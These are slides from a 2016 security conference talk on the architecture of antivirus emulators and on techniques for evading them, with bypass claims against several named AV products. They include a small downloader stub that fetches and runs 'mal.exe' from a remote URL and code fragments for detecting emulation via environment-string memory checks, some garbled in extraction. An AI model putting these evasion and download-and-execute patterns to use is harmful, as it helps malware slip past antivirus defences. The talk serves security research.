Advanced Exploitation Techniques: Breaking AV-Emulator
XCon2016/by nEINEI 
Who is @nEINEI
• nEINEI -
PI:EMAIL
• Security researcher / software developer /reverse engineer
• http://www.vxjump.net
• Research interests 
• Vulnerability, Advanced Exploitation Techniques ,NIPS/HIPS 
• Complexity Virus/Reverse engineering/Advanced Threat
• …
Agenda
• AV-Emulator Architecture and Implementation  
• Background
• AV-Emulator detection techniques 
• Advanced Techniques On AV-Emulator Bypass
• Process stack information inspection
• C++ advanced syntactic features 
• Randomized conditional branch generation
• ROP simulation
• DLL forwarding
• Exploiting Windows memory heap management
• AV-Emulator Bypass Mitigation
AV-Emulator Architecture and Implementation  
• AV-Emulator Background？
• Evolved virus polymorphism & metamorphism
• Complex PE packers
• malicious code behavior analysis
Host 
Decryption
Poly Engine
Virus
RAM
Decryption
Poly Engine
Virus
AV-Emulator Architecture and Implementation 
• If it is an PE unpacker? 
• AV-Emulator is far beyond a simple instruction 
simulator, it is currently implemented as a whole 
package(OS simulation, hardware simulation, etc).
AV-Emulator Architecture and Implementation 
• If it is an PE packer?  NO
• Intel CPU simulation
•
Opcode identification  
•
Addressing mode
•
Instruction analysis system  
• Hardware simulation（HDD ,memory，NIC…）
• Windows OS Simulation
•
PE loader 
•
Memory management 
•
Task scheduler   
•
API simulating 
•
File system  
•
Registry system 
•
Exception handlers 
•
Thread , process 
•
Debugging system 
•
GUI system 
•
…
AV-Emulator Architecture and Implementation 
• CPU simulation methods
• Instruction simulation（used in most AV-emulators) 
• Instruction translation based on opcode, line-by-line parsing
• Inefficiency, monitor each instruction 
• …
• Dynamic translation（QEMU…）
• Translate the opcode into intermediate code and interpretive execution
• Fast，but the encryption and self-modification of malicious code results in 
multiple translations
• …
• Real Environment
• Isolated space，malicious code execution in real environment.
• Fast, instruction level control is not applicable. 
• …
AV-Emulator Architecture and Implementation 
• Simulated instruction set 
• Generic
• FPU
• 3D Now (Only few)
• …
• Memory addressing cache 
• Registration on most recent accessed memory area.
• …
• CPU exception 
• TF 
• Int3 ，int1，int n 
• Non-existent page
• Privileged instruction 
• Division by 0 exception 
• Dx register single-step exception
• …
AV-Emulator Architecture and Implementation 
• Hardware simulation 
• Memory, NIC,HDD 
• Allocate a bunch of memory blocks to simulate Memory, NIC,HDD.
• …
• PE Loader simulation
• PE file mapped to memory.
• PEB,TEB 
• …
• API simulation
• IAT
• Dynamic load
• …
• Windows GUI
• Simple thread scheduler（each thread run a fixed number of instructions, like 100.）
• Windows – message notification
• …
AV-Emulator Architecture and Implementation 
• More Code-Emulator 
• Script-Emulator& boot-Emulator by Kaspersky &&
• At 2016-8,《Detection on SWF vulnerability base on virtual stack 
machine》
• http://pdfpiw.uspto.gov/.piw?PageNum=0&docid=09396334
• Bitdefender B-HAVE 
• Virtual Machine for BAT/CMD scripts
• VB script emulator
• Virtual Machine for executable files (PE, MZ, COM, SYS, Boot Images)
• Virtual Machine for VB scripts
http://www.bitdefender.com/files/Main/file/BitDefender_Anti
virus_Technology.pdf
AV-Emulator Architecture and Implementation 
• How does the AV-Emulator detect packers automatically?
• Inspect compiler information. 
• API instruction sequence 
• Track critical API call and scan compiler signatures. 
AV-Emulator Architecture and Implementation 
• How does the AV-Emulator detect packers automatically?
• POP / OR / OR / CALL   
00401E3B | 89 65 E8               
| mov dword ptr ss:[ebp-18],esp          
00401E3E | 83 65 FC 00              
| and dword ptr ss:[ebp-4],0                  
00401E42 | 6A 01                    
| push 1                                               
00401E44 | FF 15 CC 41 40 00        | call dword ptr ds:[]
00401E4A | 59                      
| pop ecx                                               
00401E4B | 83 0D F4 32 40 00 FF     | or dword ptr ds:[],FFFFFFFF             
00401E52 | 83 0D F8 32 40 00 FF     | or dword ptr ds:[],FFFFFFFF          
00401E59 | FF 15 C8 41 40 00        | call dword ptr ds:[]   
AV-Emulator Architecture and Implementation 
• AV-Emulator detection technology？
• Critical API call
• Malformed PE file
• Malware API sequence
• API parameters dynamic analysis
• Illegal memory access request 
• Illegal file path request 
• Illegal registry path request
AV-Emulator Architecture and Implementation 
• AV-Emulator detection technology？
• Process creation  
• Sc service，loading DLL by svchost, CMD ，rundll32/net …
• AutoRun
• New service，existing service modification 
• Module load  
• Load drive，install global hook …
• GUI 
• Hide windows，AV software window handler enumeration…
• Network
• SPI hook install, HOST file modification…
• Cross-process  
• Read/write other processes 
AV-Emulator Architecture and Implementation 
• Registry  
• IEFO, disable Taskmagr/regedit,IE configuration 
modification …
• Process enumeration 
• Kill AV software process…
• Exception operation
• Custom implementation of API feature, ntoskrnl.exe 
load…
• Sensitive behavior 
• Call int2e/sysenter, bootmgr/ntldr/boot.ini 
read/write… 
AV-Emulator Architecture and Implementation 
• Various ways to bypass AV-Emulator
• Timing attack
• Huge amount of garbage instruction execution 
• Parent process detection
• Make different conditions 
• No simulation instruction 
• Address information leakage 
• … 
• All above methods can be patched by AV-Emulator 
developer in a short time. 
AV-Emulator Architecture and Implementation 
What are we going to talk about, with it ?
BLACKHAT USA 2016 
AVLeak: Fingerprinting Antivirus Emulators for Advanced Malware Evasion
https://www.blackhat.com/us-16/briefings.html#avleak-fingerprinting-antivirus-
emulators-for-advanced-malware-evasion
No,We focus on the weaknesses of AV-Emulator implementation, which is 
extremely difficult to be fixed in a short period of time. These problems are the 
real deal to AV-Emulator and it is supposed to let us pay attention.
Advanced Exploitation Techniques
Simulate basic malware downloader function, complied by FAMS
_url
db 'http://vxjump.net/mal.exe',0
_mal
db ‘c:\\windows\\system32\\mal.exe’,0
virus_run proc
invoke URLDownloadToFile, 0, _url, _file, 0, 0
invoke ShellExecute, 0, 0, _mal, 0, 0, SW_SHOW
Invoke ExitProcess,0
virus_run end
start: 
call  virus_run
Process stack information inspection
• Inspect at the address 0x10000
• The environment variable information stores at 0x10000 on WinXP, bypass AV-
emulator by checking the position of value “00 00 00 00…”. 
Address      Hex dump
00010000 41 00 4C 00 4C 00 55 00 53 00 45 00 52 00 53 00  A.L.L.U.S.E.R.S.
00010010  50 00 52 00 4F 00 46 00 49 00 4C 00 45 00 3D 00  P.R.O.F.I.L.E.=.
00010020  43 00 3A 00 5C 00 44 00 6F 00 63 00 75 00 6D 00  C.:.\.D.o.c.u.m.
00010030  65 00 6E 00 74 00 73 00 20 00 61 00 6E 00 64 00  e.n.t.s. .a.n.d.
1004020 00 53 00 65 00 74 00 74 00 69 00 6E 00 67 00   .S.e.t.t.i.n.g.
00010760 6E 00 64 00 69 00 72 00 3D 00 43 00 3A 00 5C 00  n.d.i.r.=.C.:.\.
00010770  57 00 49 00 4E 00 44 00 4F 00 57 00 53 00 00 00  W.I.N.D.O.W.S...
00010780  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00010790  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000107A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000107B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
000107C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
char *p = (char*)0x10000; 
for (int i = 0 ; i  30){
break;
}
}
else{
i++;
}
}
Inspect process stack information > WINXP
• Fetch the environment variable address of current process by 
calling GetEnvironmentStrings. 
• Then search the file path of current executable file，if there is 
no such information ,the code is running in the AV-Emulator.
Address      Hex dump
004B1FC8
3D 3A 3A 3D 3A 3A 5C 00 41 4C 4C 55 53 45 52 53  =::=::\.ALLUSERS
004B1FD8  50 52 4F 46 49 4C 45 3D 43 3A 5C 50 72 6F 67 72  PROFILE=C:\Progr
004B1FE8  61 6D 44 61 74 61 00 41 50 50 44 41 54 41 3D 43  amData.APPDATA=C
004B1FF8  3A 5C 55 73 65 72 73 5C 4A 69 66 65 6E 67 5C 41  :\Users\Jifeng\A
004B2008  70 70 44 61 74 61 5C 52 6F 61 6D 69 6E 67 00 43  ppData\Roaming.C
004B2018  4C 41 53 53 50 41 54 48 3D 3B 43 3A 5C 50 72 6F  LASSPATH=;C:\Pro
004B2028  67 72 61 6D 20 46 69 6C 65 73 5C 4A 61 76 61 5C  gram Files\Java\
004B2038  6A 64 6B 31 2E 37 2E 30 5F 34 30 5C 6C 69 62 5C  jdk1.7.0_40\lib\
Inspect process stack information
DWORD min = (DWORD)pEnv; //char* pEnv = GetEnvironmentStrings(); pEnv = 0x004B1FC8
min -= 0x10000;
min &= 0xffff0000;    search range｛min ，（DWORD）pEnv｝
Address      Hex dump
004A59F9
44 3A 5C 5B 52 65 73 65 61 72 63 68 5D 5C 44 65  D:\[Research]\De
004A5A09  65 70 20 52 65 73 65 61 72 63 68 5C 41 64 76 61  ep Research\Adva
004A5A19  6E 63 65 64 20 42 79 70 61 73 73 20 41 56 56 4D  nced Bypass AVVM
004A5A29  5C 64 65 6D 6F 5C 62 79 70 61 73 73 5F 6D 6D 78  \demo\bypass_mmx
004A5A39  5F 65 73 65 74 5C 62 79 70 61 73 73 65 73 74 5C  _eset\bypassest\
004A5A49  52 65 6C 65 61 73 65 5C 62 79 70 61 73 73 65 73  Release\bypasses
004A5A59  74 2E 65 78 65 22 00 AB AB AB AB AB AB AB AB 00  t.exe".
.
004A5A69  00 00 00 00 00 00 00 FB 1E BA 58 01 C5 00 1C 43  .......?篨?C
004A5A79  00 3A 00 5C 00 57 00 69 00 6E 00 64 00 6F 00 77  .:.\.W.i.n.d.o.w
Advanced Exploitation Techniques
• Bypass:
• Kaspersky KIS2016
• Norman Suite 11
• Bitdefender Anti-virus2016 
• ESET Smart Seurity8 
• VBA32  